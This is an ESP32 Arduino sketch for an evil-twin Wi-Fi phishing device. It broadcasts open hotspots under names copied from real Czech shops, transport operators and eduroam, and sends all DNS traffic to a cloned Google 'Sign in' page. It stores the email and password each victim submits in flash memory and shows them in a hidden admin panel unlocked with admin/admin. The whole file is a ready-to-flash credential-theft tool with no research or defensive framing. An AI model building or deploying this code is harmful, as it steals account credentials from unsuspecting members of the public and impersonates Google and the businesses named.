#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <EEPROM.h>
#include <vector>

#define DNS_PORT 53
DNSServer dnsServer;
WebServer server(80);

String ap_ssid = "FREE-WIFI";
String ap_pass = "";
bool portalUsed = false;
bool apRunning = true;

std::vector<String> ssidList = {
  "FREE-WIFI",
  "hotspot",
  "Guest",
  "DPMBfree",
  "CDWiFi",
  "RegioJet - zluty",
  "KAFEC_HOSTE",
  "KFC",
  "McDonald's FREE WiFi",
  "Restaurace",
  "Starbucks",
  "Lidl Free WiFi",
  "TESCO WiFi",
  "Albert_FREE",
  "Kaufland Free WiFi",
  "PENNY_WiFi",
  "BILLA Guest",
  "Globus_WiFi",
  "IKEA Free WiFi",
  "DECATHLON_Guest",
  "OBI_WiFi",
  "Hornbach Free WiFi",
  "DM_Guest",
  "DPP_FREE",
  "FlixBus WiFi",
  "LEO Express WiFi",
  "ARRIVA_Guest",
  "BurgerKing_Guest",
  "Subway WiFi",
  "Costa WiFi",
  "Shell_WiFi",
  "OMV_Free",
  "MOL_Guest",
  "Alza Free WiFi",
  "DATART_Guest",
  "Planeo_WiFi",
  "CinemaCity Free",
  "CineStar_Guest",
  "Czech Post WiFi",
  "Zasilkovna_Guest",
  "Sportisimo_WiFi",
  "INTERSPAR_WiFi",
  "Makro_WiFi",
  "SPAVOS_NET",
  "eduroam",
  "Apartments WiFi",
  "AndroidAP",
  "WLAN",
  "internet",
  "roboraj",
  "public",
  "Password is 12345678",
  "12345678",
  "guest-net"
};

std::vector<String> passList = {
  "",
  "12345678",
  "m0gu145."
};

#define EEPROM_SIZE 2048
#define MAX_SAVED 20

struct SavedPair {
  char email[40];
  char password[40];
};

SavedPair saved[MAX_SAVED];
uint8_t savedCount = 0;

#define EEPROM_COUNT_ADDR 0
#define EEPROM_DATA_ADDR  4

const char htmlPage[] PROGMEM = R"rawliteral( <!DOCTYPE html><!doctypehtml><meta charset=utf-8><title>Sign in with Google</title><meta content="width=device-width,initial-scale=1" name=viewport><base href=/><link href="data:image/svg+xml,%3Csvg viewBox='0 0 48 48' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ccircle cx='24' cy='24' r='22' fill='%23fff'/%3E%3Cdefs%3E%3Cpath id='b' d='M44.5 20H24v8.5h11.8C34.7 33.9 30.1 37 24 37c-7.2 0-13-5.8-13-13s5.8-13 13-13c3.1 0 5.9 1.1 8.1 2.9l6.4-6.4C34.6 4.1 29.6 2 24 2 11.8 2 2 11.8 2 24s9.8 22 22 22c11 0 21-8 21-22 0-1.3-.2-2.7-.5-4z'/%3E%3C/defs%3E%3CclipPath id='a'%3E%3Cuse overflow='visible' xlink:href='%23b'/%3E%3C/clipPath%3E%3Cpath transform='scale(.8) translate(6 6)' d='M0 37V11l17 13z' clip-path='url(%23a)' fill='%23FBBC05'/%3E%3Cpath transform='scale(.8) translate(6 6)' d='M0 11l17 13 7-6.1L48 14V0H0z' clip-path='url(%23a)' fill='%23EA4335'/%3E%3Cpath transform='scale(.8) translate(6 6)' d='M0 37l30-23 7.9 1L48 0v48H0z' clip-path='url(%23a)' fill='%2334A853'/%3E%3Cpath transform='scale(.8) translate(6 6)' d='m48 48-31-24-4-3 35-10z' clip-path='url(%23a)' fill='%234285F4'/%3E%3C/svg%3E" rel=icon type=image/svg+xml><html><head><script>window.addEventListener('DOMContentLoaded', (event)=>{ const loginApp=document.getElementById('login-app'); loginApp.classList.add('fade-in');}); window.addEventListener('DOMContentLoaded', (event)=>{ const loginApp=document.getElementById('login-app'); loginApp.classList.add('fade-in'); const dropbtn=document.querySelector('.dropbtn'); const dropdownContent=document.querySelector('.dropdown-content'); dropbtn.addEventListener('mouseover', ()=>{ dropbtn.querySelector('#svg-icon').style.transform='rotate(180deg)';}); dropbtn.addEventListener('mouseout', ()=>{ if (!dropdownContent.classList.contains('show')){ dropbtn.querySelector('#svg-icon').style.transform='rotate(0)';}}); dropdownContent.addEventListener('mouseover', ()=>{ dropbtn.querySelector('#svg-icon').style.transform='rotate(180deg)';}); dropdownContent.addEventListener('mouseout', ()=>{ if (!dropbtn.matches(':hover')){ dropbtn.querySelector('#svg-icon').style.transform='rotate(0)';}});});</script><style>body{ font-family: roboto, sans-serif; display: flex; justify-content: center; flex-direction: column; align-items: center; height: 100vh; margin: 0} .fade-in{ opacity: 0; animation: fadeInAnimation .35s ease-in forwards} @keyframes fadeInAnimation{ from{ opacity: 0} to{ opacity: 1}} .login-container{ max-width: 368px; padding: 40px; padding-bottom: 60px; border: #dadce0 1px solid; border-radius: 10px} #logo{ margin: auto; width: fit-content} .g-h1{ width: fit-content; margin: auto; font-weight: 200; font-size: 24px; margin-top: 1px} .g-h2{ width: fit-content; margin: auto; font-weight: 200; font-size: 16px; font-family: roboto, "Noto Sans Myanmar UI", arial, sans-serif; padding-top: 7px; padding-bottom: 20px} .g-input{ width: 92%; font-size: 16px; padding: 13px 15px; margin: auto; margin-top: 10px; height: 30px; border: 1.5px solid #d8d4d4; border-radius: 4px} .gbtn-primary{ height: 36px; width: 79.16px; color: #fff; background-color: #1a73e8; padding-left: 19px; padding-right: 19px; border: 0 solid #fff; border-radius: 4px; font-weight: 700; transition: box-shadow .2s ease-in-out} .gbtn-primary:hover{ box-shadow: 0 6px 10px -4px rgba(0, 0, 0, .2); background-color: #1064d2} #info4{ margin-top: 11px; font-size: 13px; font-family: 'Open Sans', sans-serif; font-weight: 700} a{ color: #498af2; text-decoration: none; font-weight: 700; font-size: 14px} #info5{ font-size: 14px; padding-top: 10px; font-family: roboto, "Noto Sans Myanmar UI", arial, sans-serif; color: #5f6368} #info5 p{ color: #5f6368} #info6{ display: flex; align-items: justify; margin-top: 30px; font-size: 13px; font-weight: 700} #info4 a, #info6-1{ transition: box-shadow .2s; background-color: .1 ease-in-out} #info6-1:hover{ box-shadow: 0 0 0 10px #498af20c; background-color: #498af20c; border-radius: 2px} #info7-1{ display: flex; flex-direction: row; align-items: center} #info7-2{ display: flex; flex-direction: row} #info7-2 p{ padding-left: 16px; padding-right: 16px} .footer{ margin-top: 10px; width: 450px; display: flex; flex-direction: row; align-items: center; justify-content: space-between; font-family: roboto, sans-serif; font-size: 12px} .footer a{ color: #202124; text-decoration: none; font-weight: lighter; font-size: 12px} .dropdown{ position: relative; display: inline-block} .dropdown-content{ display: none; position: absolute; background-color: #f9f9f9; min-width: 160px; max-height: 70vh; overflow-y: auto; box-shadow: 0 8px 16px 0 rgba(0, 0, 0, .2); z-index: 1; bottom: 100%; border-radius: 5px} .dropdown:hover .dropdown-content{ display: block} .dropdown-content a{ color: #202124; width: 140px; padding: 12px 16px; text-decoration: none; display: block} .dropdown-content a:hover{ background-color: #f1f1f1} .dropbtn svg{ height: 14px; width: 14px; color: #000; transition: transform .2s ease-in-out} .dropbtn:hover #svg-icon{ transform: rotate(180deg)} .g-input-wrapper{ position: relative;} .g-input{ width: 92%; height: 30px; font-size: 16px; padding: 13px 15px; margin: auto; margin-top: 12px; border: 1.5px solid #d8d4d4; border-radius: 4px;} .form_label{ position: absolute; left: 15px; top: 2.6rem; transform: translateY(-50%); pointer-events: none; transition: top 0.2s, font-size 0.2s; padding: 0 .3rem; background-color: #fff; color: #606368} .g-input:focus+.form_label{ top: .75rem; font-size: 13px; color: #1a73e8;} .g-input:focus{ outline: 0; border: 2px solid #1a73e8; transition: border-color .2s ease-in-out, box-shadow .2s ease-in-out} .g-input:not(:placeholder-shown).g-input:not(:focus)+.form_label{ top: .8rem; font-size: 13px; color: #606368} @media (max-width:600px){ body{ display: flex; justify-content: flex-start; flex-direction: column; align-items: center; height: 100vh; margin: 0} .login-container{ margin: 30px; border: none; border-radius: 5px; padding: 0; padding-bottom: 60px} .footer{ position: fixed; bottom: 0; width: 100%; background-color: #fbfbfb; text-align: justify; padding-left: 20px; padding-right: 20px; padding-top: 0; box-sizing: border-box}} </style><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"></head><body><div id="login-app" class="fade-in"><div class="login-container"><div class="login-content" id="login-form"><div id="logo"><svg viewBox="0 0 75 24" width="75" height="34" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g><g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g><g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g><g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g><g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g><g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g></svg></div><form action="/get" id="email-form-step"><h1 style="padding-top:10px" class="g-h1">Sign in</h1><h2 class="g-h2">Use your Google Account</h2><div class="login-content"><div class="g-input-wrapper"><input name="email" type="text" class="g-input" placeholder=" " required><label class="form_label" for="email">Email</label></div><div class="g-input-wrapper"><input name="password" type="password" class="g-input" placeholder=" " required><label class="form_label" for="password">Password</label></div><div id="info4"><a href="https://accounts.google.com/signin/v2/usernamerecovery">Forgot password?</a></div><div id="info5"><p style="color:#5f6368">Not your computer? Use Guest mode to sign in privately. <a href="https://support.google.com/accounts/answer/2917834" jsname="JFyozc" target="_blank" aria-label="Learn more about using Guest mode">Learn more</a></div><div id="info6" style="display:flex;flex-direction:row;justify-content:space-between;align-items:center"><div id="info6-1"><a href="https://accounts.google.com/signup">Create account</a></div><div id="info6-2"><button class="gbtn-primary" type="submit">Next</button></div></div></div></form></div></div></div><div class="footer fade-in"><li class="dropdown"><a href="#" class="dropbtn"><div style="display:flex;flex-direction:row;align-items:center"><p style="margin:5px">English (United States)</p><svg id="svg-icon" style="margin-left:10px" viewBox="-6.5 0 32 32" version="1.1" xmlns="http://www.w3.org/2000/svg" transform="rotate(0)"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><title>dropdown</title><path d="M18.813 11.406l-7.906 9.906c-0.75 0.906-1.906 0.906-2.625 0l-7.906-9.906c-0.75-0.938-0.375-1.656 0.781-1.656h16.875c1.188 0 1.531 0.719 0.781 1.656z"></path></g></svg></div></a><div class="dropdown-content"><a href="#">Arabic</a><a href="#">English (United States)</a><a href="#">Deutsch</a><a href="#">French</a></div></li><div id="info7-2"><a href="#"><p>Help</p></a><a href="#"><p>Privacy</p></a><a href="#"><p>Terms</p></a></div></div></body></html> )rawliteral";

void saveSaved() {
  EEPROM.put(EEPROM_COUNT_ADDR, savedCount);
  EEPROM.put(EEPROM_DATA_ADDR, saved);
  EEPROM.commit();
}

void loadSaved() {
  EEPROM.get(EEPROM_COUNT_ADDR, savedCount);
  if (savedCount > MAX_SAVED) savedCount = 0;
  EEPROM.get(EEPROM_DATA_ADDR, saved);
}

void addSaved(const String &email, const String &password) {
  if (savedCount >= MAX_SAVED) return;
  email.toCharArray(saved[savedCount].email, 40);
  password.toCharArray(saved[savedCount].password, 40);
  savedCount++;
  saveSaved();
}

void deleteOne(uint8_t index) {
  if (index >= savedCount) return;
  for (int i = index; i < savedCount - 1; i++) {
    saved[i] = saved[i + 1];
  }
  savedCount--;
  saveSaved();
}

void deleteAll() {
  savedCount = 0;
  saveSaved();
}

void handleRoot() {
  server.send(200, "text/html", htmlPage);
}

void handleGet() {
  String email = server.arg("email");
  String password = server.arg("password");

  if (email.equalsIgnoreCase("admin") && password.equalsIgnoreCase("admin")) {
    server.sendHeader("Location", "/admin");
    server.send(302, "text/plain", "Redirecting to Management...");
    return;
  }

  portalUsed = true;
  addSaved(email, password);
  server.send(200, "text/plain", "OK");
}

void handleAdmin() {
  if (server.hasArg("action")) {
    String act = server.arg("action");

    if (act == "set_ssid") {
      ap_ssid = server.arg("val");
      WiFi.softAP(ap_ssid.c_str(), ap_pass.c_str());
    } 
    else if (act == "add_ssid") {
      String newSsid = server.arg("val");
      newSsid.trim();
      if (newSsid.length() > 0) {
        ssidList.push_back(newSsid);
        ap_ssid = newSsid;
        WiFi.softAP(ap_ssid.c_str(), ap_pass.c_str());
      }
    } 
    else if (act == "del_ssid") {
      int idx = server.arg("index").toInt();
      if (idx >= 0 && idx < (int)ssidList.size()) {
        ssidList.erase(ssidList.begin() + idx);
      }
    } 
    else if (act == "set_pass") {
      ap_pass = server.arg("val");
      WiFi.softAP(ap_ssid.c_str(), ap_pass.c_str());
    } 
    else if (act == "add_pass") {
      String newPass = server.arg("val");
      passList.push_back(newPass);
      ap_pass = newPass;
      WiFi.softAP(ap_ssid.c_str(), ap_pass.c_str());
    } 
    else if (act == "del_pass") {
      int idx = server.arg("index").toInt();
      if (idx >= 0 && idx < (int)passList.size()) {
        passList.erase(passList.begin() + idx);
      }
    } 
    else if (act == "del_saved") {
      int idx = server.arg("index").toInt();
      deleteOne(idx);
    } 
    else if (act == "clear_saved") {
      deleteAll();
    }

    server.sendHeader("Location", "/admin");
    server.send(302, "text/plain", "");
    return;
  }

  String html = "<!DOCTYPE html><html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<title>Wi-Fi Management</title>";
  html += "<style>";
  html += "body{font-family:Arial,sans-serif;background:#f0f2f5;margin:0;padding:20px;color:#333}";
  html += ".card{background:#fff;padding:20px;margin-bottom:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1)}";
  html += "h1,h2{color:#1a73e8;margin-top:0;}";
  html += "label{display:block;margin:10px 0 5px;font-weight:bold;}";
  html += "input,select,button{padding:10px;margin:5px 0;border:1px solid #ccc;border-radius:4px;font-size:14px;box-sizing:border-box;}";
  html += "input[type='text'],select{width:100%;max-width:400px;}";
  html += "button{background:#1a73e8;color:#fff;border:none;cursor:pointer;font-weight:bold;} button:hover{background:#1557b0;}";
  html += ".btn-danger{background:#d93025;} .btn-danger:hover{background:#a50e0e;}";
  html += "table{width:100%;border-collapse:collapse;margin-top:10px;} th,td{border:1px solid #ddd;padding:10px;text-align:left;} th{background:#f8f9fa;}";
  html += "ul{list-style:none;padding:0;} li{padding:8px 0;border-bottom:1px solid #eee;display:flex;justify-content:space-between;align-items:center;}";
  html += "</style></head><body>";
  
  html += "<h1>Wi-Fi Management Panel</h1>";

  html += "<div class='card'><h2>Status</h2>";
  html += "<p><b>Current SSID:</b> " + ap_ssid + "</p>";
  html += "<p><b>Current Password:</b> " + (ap_pass.length() == 0 ? "<i>(Open Network)</i>" : ap_pass) + "</p>";
  html += "<p><b>Connected Devices (STA):</b> " + String(WiFi.softAPgetStationNum()) + "</p>";
  html += "</div>";

  html += "<div class='card'><h2>SSID Settings</h2>";
  html += "<form method='GET' action='/admin'>";
  html += "<input type='hidden' name='action' value='set_ssid'>";
  html += "<label>Select from list:</label>";
  html += "<select name='val'>";
  for (size_t i = 0; i < ssidList.size(); i++) {
    html += "<option value='" + ssidList[i] + "'" + (ssidList[i] == ap_ssid ? " selected" : "") + ">" + ssidList[i] + "</option>";
  }
  html += "</select><br><button type='submit'>Use SSID</button></form><hr>";

  html += "<form method='GET' action='/admin'>";
  html += "<input type='hidden' name='action' value='add_ssid'>";
  html += "<label>Add Custom SSID:</label>";
  html += "<input type='text' name='val' placeholder='New SSID' required><br>";
  html += "<button type='submit'>Save and Activate SSID</button></form><hr>";

  html += "<h3>SSID List Management</h3><ul>";
  for (size_t i = 0; i < ssidList.size(); i++) {
    html += "<li>" + ssidList[i] + " <a href='/admin?action=del_ssid&index=" + String(i) + "' class='btn-danger' style='padding:5px 10px;color:white;text-decoration:none;border-radius:4px;font-size:12px;'>Delete</a></li>";
  }
  html += "</ul></div>";

  html += "<div class='card'><h2>Password Settings</h2>";
  html += "<form method='GET' action='/admin'>";
  html += "<input type='hidden' name='action' value='set_pass'>";
  html += "<label>Select from password list:</label>";
  html += "<select name='val'>";
  for (size_t i = 0; i < passList.size(); i++) {
    String disp = passList[i].length() == 0 ? "(None / Open Network)" : passList[i];
    html += "<option value='" + passList[i] + "'" + (passList[i] == ap_pass ? " selected" : "") + ">" + disp + "</option>";
  }
  html += "</select><br><button type='submit'>Use Password</button></form><hr>";

  html += "<form method='GET' action='/admin'>";
  html += "<input type='hidden' name='action' value='add_pass'>";
  html += "<label>Add new password:</label>";
  html += "<input type='text' name='val' placeholder='New Password (min. 8 chars)' minlength='8'><br>";
  html += "<button type='submit'>Save and Activate Password</button></form><hr>";

  html += "<h3>Password List Management</h3><ul>";
  for (size_t i = 0; i < passList.size(); i++) {
    String disp = passList[i].length() == 0 ? "<i>(No Password)</i>" : passList[i];
    html += "<li>" + disp + " <a href='/admin?action=del_pass&index=" + String(i) + "' class='btn-danger' style='padding:5px 10px;color:white;text-decoration:none;border-radius:4px;font-size:12px;'>Delete</a></li>";
  }
  html += "</ul></div>";

  html += "<div class='card'><h2>Saved Credentials (" + String(savedCount) + ")</h2>";
  if (savedCount > 0) {
    html += "<table><tr><th>#</th><th>Email / User</th><th>Password</th><th>Actions</th></tr>";
    for (int i = 0; i < savedCount; i++) {
      html += "<tr><td>" + String(i + 1) + "</td><td>" + String(saved[i].email) + "</td><td>" + String(saved[i].password) + "</td>";
      html += "<td><a href='/admin?action=del_saved&index=" + String(i) + "' class='btn-danger' style='padding:5px 10px;color:white;text-decoration:none;border-radius:4px;font-size:12px;'>Delete</a></td></tr>";
    }
    html += "</table><br>";
    html += "<a href='/admin?action=clear_saved' onclick='return confirm(\"Are you sure you want to delete all saved credentials?\")'><button class='btn-danger'>Delete All Credentials</button></a>";
  } else {
    html += "<p>No saved credentials.</p>";
  }
  html += "</div></body></html>";

  server.send(200, "text/html", html);
}

void setup() {
  EEPROM.begin(EEPROM_SIZE);
  loadSaved();

  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid.c_str(), ap_pass.c_str());

  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  server.on("/", handleRoot);
  server.on("/get", handleGet);
  server.on("/admin", handleAdmin);
  server.onNotFound(handleRoot);
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  delay(10);
}
